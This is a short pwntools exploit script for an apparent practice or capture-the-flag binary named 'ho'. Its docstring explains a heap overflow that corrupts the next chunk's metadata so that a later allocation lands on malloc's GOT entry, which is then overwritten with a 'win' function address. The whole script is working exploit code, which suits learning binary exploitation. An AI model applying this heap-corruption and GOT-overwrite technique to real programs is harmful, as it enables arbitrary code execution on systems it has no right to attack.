#!/usr/bin/env python3

"""
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x3ff000)
ASLR:       Enabled

Heap overflows occur when data exceeds the bounds of a heap-allocated buffer, corrupting adjacent memory. They can lead to arbitrary 
code execution or memory corruption by manipulating control structures.

The exploit abuses a heap overflow by overwriting the metadata of an next chunk to point to GOT address of malloc. It then overwrites 
malloc with the address of the win function. Then the very next call to malloc calls to win function.
"""

from pwn import *

bin = context.binary = ELF("./ho")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([bin.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([bin.path] + argv, *a, **kw)


gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# -- Exploit goes here --


def malloc(size):
    io.sendlineafter(b"exit\n", f"1 {size}".encode())


def free(index):
    io.sendlineafter(b"exit\n", f"2 {index}".encode())


def edit(index, data):
    io.sendlineafter(b"exit\n", f"3 {index} ".encode() + data)


io = start()

malloc(8)
malloc(8)
free(1)
edit(0, cyclic(24) + pack(0x21) + pack(bin.got.malloc))
malloc(8)
malloc(8)
edit(3, pack(bin.sym.win))
malloc(8)

io.interactive()
